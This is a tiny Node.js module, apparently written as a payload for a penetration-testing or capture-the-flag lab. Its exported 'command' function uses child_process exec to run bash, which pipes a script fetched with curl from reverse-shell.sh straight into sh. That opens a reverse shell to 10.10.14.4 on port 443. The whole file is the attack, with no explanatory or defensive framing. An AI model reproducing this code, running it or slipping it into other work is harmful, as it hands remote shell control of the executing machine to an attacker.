const { exec } = require('child_process');


exports.command = function(){
	console.log("vert16x");
	exec('/bin/bash -c "curl https://reverse-shell.sh/10.10.14.4:443|sh"');
	return "deu bom";
}
